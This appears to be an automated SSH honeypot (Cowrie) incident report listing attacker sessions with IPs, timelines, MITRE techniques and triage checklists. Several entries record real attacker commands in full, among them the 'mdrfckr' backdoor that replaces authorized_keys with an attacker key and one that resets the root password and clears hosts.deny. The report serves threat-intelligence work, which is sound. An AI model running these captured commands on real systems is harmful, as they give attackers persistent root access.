| **First Seen** | 2026-03-18 02:04 |
| **Last Seen** | 2026-03-18 02:04 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-18 02:04:46` | `cowrie.session.connect` |
| `2026-03-18 02:04:46` | `cowrie.client.version` |
| `2026-03-18 02:04:46` | `cowrie.client.kex` |
| `2026-03-18 02:04:47` | `cowrie.login.success` |
| `2026-03-18 02:04:47` | `cowrie.session.params` |
| `2026-03-18 02:04:47` | `cowrie.command.input` |
| `2026-03-18 02:04:47` | `cowrie.log.closed` |
| `2026-03-18 02:04:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `137.184.78[.]9` to AbuseIPDB if not already reported
- [ ] Block `137.184.78[.]9` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5c40e2a90ed6

| Field | Detail |
|---|---|
| **Source IP** | `137.184.78[.]9` |
| **First Seen** | 2026-03-18 02:05 |
| **Last Seen** | 2026-03-18 02:05 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-18 02:05:06` | `cowrie.session.connect` |
| `2026-03-18 02:05:06` | `cowrie.client.version` |
| `2026-03-18 02:05:06` | `cowrie.client.kex` |
| `2026-03-18 02:05:07` | `cowrie.login.success` |
| `2026-03-18 02:05:07` | `cowrie.session.params` |
| `2026-03-18 02:05:07` | `cowrie.command.input` |
| `2026-03-18 02:05:07` | `cowrie.log.closed` |
| `2026-03-18 02:05:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `137.184.78[.]9` to AbuseIPDB if not already reported
- [ ] Block `137.184.78[.]9` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-78804cbd9cce

| Field | Detail |
|---|---|
| **Source IP** | `137.184.78[.]9` |
| **First Seen** | 2026-03-18 02:05 |
| **Last Seen** | 2026-03-18 02:05 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-18 02:05:26` | `cowrie.session.connect` |
| `2026-03-18 02:05:26` | `cowrie.client.version` |
| `2026-03-18 02:05:26` | `cowrie.client.kex` |
| `2026-03-18 02:05:27` | `cowrie.login.success` |
| `2026-03-18 02:05:27` | `cowrie.session.params` |
| `2026-03-18 02:05:27` | `cowrie.command.input` |
| `2026-03-18 02:05:27` | `cowrie.log.closed` |
| `2026-03-18 02:05:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `137.184.78[.]9` to AbuseIPDB if not already reported
- [ ] Block `137.184.78[.]9` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9f0f8530f2dd

| Field | Detail |
|---|---|
| **Source IP** | `137.184.78[.]9` |
| **First Seen** | 2026-03-18 02:06 |
| **Last Seen** | 2026-03-18 02:06 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-18 02:06:05` | `cowrie.session.connect` |
| `2026-03-18 02:06:05` | `cowrie.client.version` |
| `2026-03-18 02:06:06` | `cowrie.client.kex` |
| `2026-03-18 02:06:06` | `cowrie.login.success` |
| `2026-03-18 02:06:07` | `cowrie.session.params` |
| `2026-03-18 02:06:07` | `cowrie.command.input` |
| `2026-03-18 02:06:07` | `cowrie.log.closed` |
| `2026-03-18 02:06:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `137.184.78[.]9` to AbuseIPDB if not already reported
- [ ] Block `137.184.78[.]9` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5586a9e1ec90

| Field | Detail |
|---|---|
| **Source IP** | `137.184.78[.]9` |
| **First Seen** | 2026-03-18 02:06 |
| **Last Seen** | 2026-03-18 02:06 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-18 02:06:25` | `cowrie.session.connect` |
| `2026-03-18 02:06:25` | `cowrie.client.version` |
| `2026-03-18 02:06:25` | `cowrie.client.kex` |
| `2026-03-18 02:06:26` | `cowrie.login.success` |
| `2026-03-18 02:06:26` | `cowrie.session.params` |
| `2026-03-18 02:06:26` | `cowrie.command.input` |
| `2026-03-18 02:06:27` | `cowrie.log.closed` |
| `2026-03-18 02:06:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `137.184.78[.]9` to AbuseIPDB if not already reported
- [ ] Block `137.184.78[.]9` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-864124fd55d5

| Field | Detail |
|---|---|
| **Source IP** | `101.36.106[.]113` |
| **First Seen** | 2026-03-18 03:24 |
| **Last Seen** | 2026-03-18 03:24 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-18 03:24:40` | `cowrie.session.connect` |
| `2026-03-18 03:24:40` | `cowrie.client.version` |
| `2026-03-18 03:24:40` | `cowrie.client.kex` |
| `2026-03-18 03:24:41` | `cowrie.login.success` |
| `2026-03-18 03:24:41` | `cowrie.session.params` |
| `2026-03-18 03:24:41` | `cowrie.command.input` |
| `2026-03-18 03:24:41` | `cowrie.command.failed` |
| `2026-03-18 03:24:41` | `cowrie.log.closed` |
| `2026-03-18 03:24:42` | `cowrie.session.params` |
| `2026-03-18 03:24:42` | `cowrie.command.input` |
| `2026-03-18 03:24:42` | `cowrie.session.file_download` |
| `2026-03-18 03:24:42` | `cowrie.log.closed` |
| `2026-03-18 03:24:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.36.106[.]113` to AbuseIPDB if not already reported
- [ ] Block `101.36.106[.]113` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6c51fa89fe96

| Field | Detail |
|---|---|
| **Source IP** | `101.36.106[.]113` |
| **First Seen** | 2026-03-18 03:24 |
| **Last Seen** | 2026-03-18 03:24 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-18 03:24:44` | `cowrie.session.connect` |
| `2026-03-18 03:24:44` | `cowrie.client.version` |
| `2026-03-18 03:24:44` | `cowrie.client.kex` |
| `2026-03-18 03:24:44` | `cowrie.login.success` |
| `2026-03-18 03:24:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.36.106[.]113` to AbuseIPDB if not already reported
- [ ] Block `101.36.106[.]113` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6040826e229b

| Field | Detail |
|---|---|
| **Source IP** | `219.153.106[.]29` |
| **First Seen** | 2026-03-18 04:12 |
| **Last Seen** | 2026-03-18 04:17 |
| **Session Duration** | 302s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-18 04:12:49` | `cowrie.session.connect` |
| `2026-03-18 04:12:49` | `cowrie.client.version` |
| `2026-03-18 04:12:49` | `cowrie.client.kex` |
| `2026-03-18 04:12:51` | `cowrie.login.success` |
| `2026-03-18 04:17:51` | `cowrie.session.file_upload` |
| `2026-03-18 04:17:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `219.153.106[.]29` to AbuseIPDB if not already reported
- [ ] Block `219.153.106[.]29` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1977f0c72a9c

| Field | Detail |
|---|---|
| **Source IP** | `180.76.245[.]60` |
| **First Seen** | 2026-03-18 05:04 |
| **Last Seen** | 2026-03-18 05:05 |
| **Session Duration** | 41s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:z3pRNDK6cVqs"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-18 05:04:40` | `cowrie.session.connect` |
| `2026-03-18 05:04:40` | `cowrie.client.version` |
| `2026-03-18 05:04:41` | `cowrie.client.kex` |
| `2026-03-18 05:04:43` | `cowrie.login.success` |
| `2026-03-18 05:04:43` | `cowrie.session.params` |
| `2026-03-18 05:04:43` | `cowrie.command.input` |
| `2026-03-18 05:04:43` | `cowrie.command.failed` |
| `2026-03-18 05:04:44` | `cowrie.log.closed` |
| `2026-03-18 05:04:44` | `cowrie.session.params` |
| `2026-03-18 05:04:44` | `cowrie.command.input` |
| `2026-03-18 05:04:45` | `cowrie.session.file_download` |
| `2026-03-18 05:04:45` | `cowrie.log.closed` |
| `2026-03-18 05:04:59` | `cowrie.session.params` |
| `2026-03-18 05:04:59` | `cowrie.command.input` |
| `2026-03-18 05:05:00` | `cowrie.log.closed` |
| `2026-03-18 05:05:01` | `cowrie.session.params` |
| `2026-03-18 05:05:01` | `cowrie.command.input` |
| `2026-03-18 05:05:01` | `cowrie.log.closed` |
| `2026-03-18 05:05:02` | `cowrie.session.params` |
| `2026-03-18 05:05:02` | `cowrie.command.input` |
| `2026-03-18 05:05:02` | `cowrie.session.file_download` |
| `2026-03-18 05:05:02` | `cowrie.log.closed` |
| `2026-03-18 05:05:03` | `cowrie.session.params` |
| `2026-03-18 05:05:03` | `cowrie.command.input` |
| `2026-03-18 05:05:04` | `cowrie.log.closed` |
| `2026-03-18 05:05:06` | `cowrie.session.params` |
| `2026-03-18 05:05:06` | `cowrie.command.input` |
| `2026-03-18 05:05:07` | `cowrie.log.closed` |
| `2026-03-18 05:05:07` | `cowrie.session.params` |
| `2026-03-18 05:05:07` | `cowrie.command.input` |
| `2026-03-18 05:05:07` | `cowrie.command.input` |
| `2026-03-18 05:05:08` | `cowrie.log.closed` |
| `2026-03-18 05:05:09` | `cowrie.session.params` |
| `2026-03-18 05:05:09` | `cowrie.command.input` |
| `2026-03-18 05:05:09` | `cowrie.log.closed` |
| `2026-03-18 05:05:13` | `cowrie.session.params` |
| `2026-03-18 05:05:13` | `cowrie.command.input` |
| `2026-03-18 05:05:13` | `cowrie.log.closed` |
| `2026-03-18 05:05:14` | `cowrie.session.params` |
| `2026-03-18 05:05:14` | `cowrie.command.input` |
| `2026-03-18 05:05:14` | `cowrie.log.closed` |
| `2026-03-18 05:05:14` | `cowrie.session.params` |
| `2026-03-18 05:05:14` | `cowrie.command.input` |
| `2026-03-18 05:05:15` | `cowrie.log.closed` |
| `2026-03-18 05:05:15` | `cowrie.session.params` |
| `2026-03-18 05:05:15` | `cowrie.command.input` |
| `2026-03-18 05:05:15` | `cowrie.log.closed` |
| `2026-03-18 05:05:16` | `cowrie.session.params` |
| `2026-03-18 05:05:16` | `cowrie.command.input` |
| `2026-03-18 05:05:16` | `cowrie.log.closed` |
| `2026-03-18 05:05:17` | `cowrie.session.params` |
| `2026-03-18 05:05:17` | `cowrie.command.input` |
| `2026-03-18 05:05:17` | `cowrie.log.closed` |
| `2026-03-18 05:05:18` | `cowrie.session.params` |
| `2026-03-18 05:05:18` | `cowrie.command.input` |
| `2026-03-18 05:05:18` | `cowrie.log.closed` |
| `2026-03-18 05:05:19` | `cowrie.session.params` |
| `2026-03-18 05:05:19` | `cowrie.command.input` |
| `2026-03-18 05:05:21` | `cowrie.log.closed` |
| `2026-03-18 05:05:21` | `cowrie.session.params` |
| `2026-03-18 05:05:21` | `cowrie.command.input` |
| `2026-03-18 05:05:22` | `cowrie.log.closed` |
| `2026-03-18 05:05:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `180.76.245[.]60` to AbuseIPDB if not already reported
- [ ] Block `180.76.245[.]60` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-da6e52c3fe26

| Field | Detail |
|---|---|
| **Source IP** | `103.7.41[.]144` |
| **First Seen** | 2026-03-18 06:12 |
| **Last Seen** | 2026-03-18 06:12 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-18 06:12:24` | `cowrie.session.connect` |
| `2026-03-18 06:12:24` | `cowrie.client.version` |
| `2026-03-18 06:12:24` | `cowrie.client.kex` |
| `2026-03-18 06:12:24` | `cowrie.login.success` |
| `2026-03-18 06:12:24` | `cowrie.session.params` |
| `2026-03-18 06:12:24` | `cowrie.command.input` |
| `2026-03-18 06:12:24` | `cowrie.command.failed` |
| `2026-03-18 06:12:24` | `cowrie.log.closed` |
| `2026-03-18 06:12:25` | `cowrie.session.params` |
| `2026-03-18 06:12:25` | `cowrie.command.input` |
| `2026-03-18 06:12:25` | `cowrie.session.file_download` |
| `2026-03-18 06:12:25` | `cowrie.log.closed` |
| `2026-03-18 06:12:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.7.41[.]144` to AbuseIPDB if not already reported
- [ ] Block `103.7.41[.]144` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cfe6cda7aaa0

| Field | Detail |
|---|---|
| **Source IP** | `103.7.41[.]144` |
| **First Seen** | 2026-03-18 06:12 |
| **Last Seen** | 2026-03-18 06:12 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-18 06:12:27` | `cowrie.session.connect` |
| `2026-03-18 06:12:27` | `cowrie.client.version` |
| `2026-03-18 06:12:27` | `cowrie.client.kex` |
| `2026-03-18 06:12:27` | `cowrie.login.success` |
| `2026-03-18 06:12:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.7.41[.]144` to AbuseIPDB if not already reported
- [ ] Block `103.7.41[.]144` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9ceb973446bf

| Field | Detail |
|---|---|
| **Source IP** | `174.138.33[.]218` |
| **First Seen** | 2026-03-18 06:41 |
| **Last Seen** | 2026-03-18 06:41 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-18 06:41:34` | `cowrie.session.connect` |
| `2026-03-18 06:41:34` | `cowrie.client.version` |
| `2026-03-18 06:41:35` | `cowrie.client.kex` |
| `2026-03-18 06:41:35` | `cowrie.login.success` |
| `2026-03-18 06:41:36` | `cowrie.session.params` |
| `2026-03-18 06:41:36` | `cowrie.command.input` |
| `2026-03-18 06:41:36` | `cowrie.log.closed` |
| `2026-03-18 06:41:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `174.138.33[.]218` to AbuseIPDB if not already reported
- [ ] Block `174.138.33[.]218` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a912c2b3248f

| Field | Detail |
|---|---|
| **Source IP** | `174.138.33[.]218` |
| **First Seen** | 2026-03-18 06:41 |
| **Last Seen** | 2026-03-18 06:41 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-18 06:41:47` | `cowrie.session.connect` |
| `2026-03-18 06:41:47` | `cowrie.client.version` |
| `2026-03-18 06:41:47` | `cowrie.client.kex` |
| `2026-03-18 06:41:48` | `cowrie.login.success` |
| `2026-03-18 06:41:49` | `cowrie.session.params` |
| `2026-03-18 06:41:49` | `cowrie.command.input` |
| `2026-03-18 06:41:49` | `cowrie.log.closed` |
| `2026-03-18 06:41:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `174.138.33[.]218` to AbuseIPDB if not already reported
- [ ] Block `174.138.33[.]218` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-65bf9cf6a312

| Field | Detail |
|---|---|
| **Source IP** | `174.138.33[.]218` |
| **First Seen** | 2026-03-18 06:42 |
| **Last Seen** | 2026-03-18 06:42 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-18 06:42:13` | `cowrie.session.connect` |
| `2026-03-18 06:42:13` | `cowrie.client.version` |
| `2026-03-18 06:42:13` | `cowrie.client.kex` |
| `2026-03-18 06:42:14` | `cowrie.login.success` |
| `2026-03-18 06:42:14` | `cowrie.session.params` |
| `2026-03-18 06:42:14` | `cowrie.command.input` |
| `2026-03-18 06:42:14` | `cowrie.log.closed` |
| `2026-03-18 06:42:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `174.138.33[.]218` to AbuseIPDB if not already reported
- [ ] Block `174.138.33[.]218` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ad150abfdc16

| Field | Detail |
|---|---|
| **Source IP** | `174.138.33[.]218` |
| **First Seen** | 2026-03-18 06:42 |
| **Last Seen** | 2026-03-18 06:42 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-18 06:42:38` | `cowrie.session.connect` |
| `2026-03-18 06:42:38` | `cowrie.client.version` |
| `2026-03-18 06:42:39` | `cowrie.client.kex` |
| `2026-03-18 06:42:39` | `cowrie.login.success` |
| `2026-03-18 06:42:40` | `cowrie.session.params` |
| `2026-03-18 06:42:40` | `cowrie.command.input` |
| `2026-03-18 06:42:40` | `cowrie.log.closed` |
| `2026-03-18 06:42:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `174.138.33[.]218` to AbuseIPDB if not already reported
- [ ] Block `174.138.33[.]218` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5d20828a9d6a

| Field | Detail |
|---|---|
| **Source IP** | `174.138.33[.]218` |
| **First Seen** | 2026-03-18 06:42 |
| **Last Seen** | 2026-03-18 06:42 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-18 06:42:51` | `cowrie.session.connect` |
| `2026-03-18 06:42:51` | `cowrie.client.version` |
| `2026-03-18 06:42:52` | `cowrie.client.kex` |
| `2026-03-18 06:42:52` | `cowrie.login.success` |
| `2026-03-18 06:42:53` | `cowrie.session.params` |
| `2026-03-18 06:42:53` | `cowrie.command.input` |
| `2026-03-18 06:42:53` | `cowrie.log.closed` |
| `2026-03-18 06:42:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `174.138.33[.]218` to AbuseIPDB if not already reported
- [ ] Block `174.138.33[.]218` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6df572643577

| Field | Detail |
|---|---|
| **Source IP** | `174.138.33[.]218` |
| **First Seen** | 2026-03-18 06:43 |
| **Last Seen** | 2026-03-18 06:43 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-18 06:43:42` | `cowrie.session.connect` |
| `2026-03-18 06:43:42` | `cowrie.client.version` |
| `2026-03-18 06:43:43` | `cowrie.client.kex` |
| `2026-03-18 06:43:43` | `cowrie.login.success` |
| `2026-03-18 06:43:44` | `cowrie.session.params` |
| `2026-03-18 06:43:44` | `cowrie.command.input` |
| `2026-03-18 06:43:44` | `cowrie.log.closed` |
| `2026-03-18 06:43:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `174.138.33[.]218` to AbuseIPDB if not already reported
- [ ] Block `174.138.33[.]218` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-affeb3078c32

| Field | Detail |
|---|---|
| **Source IP** | `174.138.33[.]218` |
| **First Seen** | 2026-03-18 06:44 |
| **Last Seen** | 2026-03-18 06:44 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-18 06:44:08` | `cowrie.session.connect` |
| `2026-03-18 06:44:08` | `cowrie.client.version` |
| `2026-03-18 06:44:08` | `cowrie.client.kex` |
| `2026-03-18 06:44:09` | `cowrie.login.success` |
| `2026-03-18 06:44:09` | `cowrie.session.params` |
| `2026-03-18 06:44:09` | `cowrie.command.input` |
| `2026-03-18 06:44:09` | `cowrie.log.closed` |
| `2026-03-18 06:44:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `174.138.33[.]218` to AbuseIPDB if not already reported
- [ ] Block `174.138.33[.]218` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c21ed1e4d029

| Field | Detail |
|---|---|
| **Source IP** | `174.138.33[.]218` |
| **First Seen** | 2026-03-18 06:44 |
| **Last Seen** | 2026-03-18 06:44 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-18 06:44:27` | `cowrie.session.connect` |
| `2026-03-18 06:44:27` | `cowrie.client.version` |
| `2026-03-18 06:44:27` | `cowrie.client.kex` |
| `2026-03-18 06:44:27` | `cowrie.login.success` |
| `2026-03-18 06:44:28` | `cowrie.session.params` |
| `2026-03-18 06:44:28` | `cowrie.command.input` |
| `2026-03-18 06:44:28` | `cowrie.log.closed` |
| `2026-03-18 06:44:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `174.138.33[.]218` to AbuseIPDB if not already reported
- [ ] Block `174.138.33[.]218` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9b0701392774

| Field | Detail |
|---|---|
| **Source IP** | `174.138.33[.]218` |
| **First Seen** | 2026-03-18 06:44 |
| **Last Seen** | 2026-03-18 06:44 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-18 06:44:52` | `cowrie.session.connect` |
| `2026-03-18 06:44:52` | `cowrie.client.version` |
| `2026-03-18 06:44:52` | `cowrie.client.kex` |
| `2026-03-18 06:44:53` | `cowrie.login.success` |
| `2026-03-18 06:44:53` | `cowrie.session.params` |
| `2026-03-18 06:44:53` | `cowrie.command.input` |
| `2026-03-18 06:44:53` | `cowrie.log.closed` |
